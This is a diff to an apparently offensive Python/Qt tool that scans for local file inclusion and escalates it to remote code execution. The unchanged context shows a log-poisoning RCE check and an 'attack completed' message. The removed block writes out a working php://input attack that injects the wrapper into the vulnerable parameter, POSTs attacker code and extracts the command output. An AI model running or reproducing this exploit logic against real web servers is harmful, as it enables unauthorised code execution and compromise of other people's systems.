@@ -72,7 +72,7 @@ class LFIThread(QThread):
                         content = res.content
 
                         preview = content[:50].replace(b'\n', b' ').decode('utf-8', errors='ignore')
-                        self.log_process.emit(f"Check LFI: ...{attack_url[-40:]} | Len: {len(content)}")
+                        self.log_process.emit(f"Check Path Treversal: ...{attack_url[-40:]} | Len: {len(content)}")
 
                         is_vuln = False
                         
@@ -129,34 +129,6 @@ class LFIThread(QThread):
                             self.log_process.emit(f"<h2 style='color:red; background:yellow'>💥 RCE VIA LOG POISONING!</h2>")
                             break
                 except: pass
-
-                # wrapper php://input
-                self.log_process.emit(">> Thử php://input (Wrapper)...")
-                try:
-                
-                    new_query_parts = []
-                    for k, v in params.items():
-                        if k == found_lfi_param: new_query_parts.append(f"{k}=php://input")
-                        else: 
-                            for val in v: new_query_parts.append(f"{k}={val}")
-                    
-                    input_url = f"{base_url}?{'&'.join(new_query_parts)}"
-                    
-                    # 2. gui post request 
-                    
-                    res = requests.post(input_url, data=self.rce_code, timeout=5)
-                    
-                    if b"HACKED" in res.content:
-                        self.ket_qua_scan.emit(url, "php://input", "RCE THÀNH CÔNG")
-                        self.log_process.emit(f"<h2 style='color:red; background:yellow'> RCE VIA PHP://INPUT!</h2>")
-                        try:
-                            output = res.text.split("HACKED")[1][:50]
-                            self.log_process.emit(f"<b>Output lệnh: {output}</b>")
-                        except: pass
-                    else:
-                        self.log_process.emit("-> php://input thất bại ")
-                except Exception as e: 
-                    pass
 
         self.log_process.emit("🏁 Đã hoàn tất tấn công!")
         self.hoan_thanh.emit()
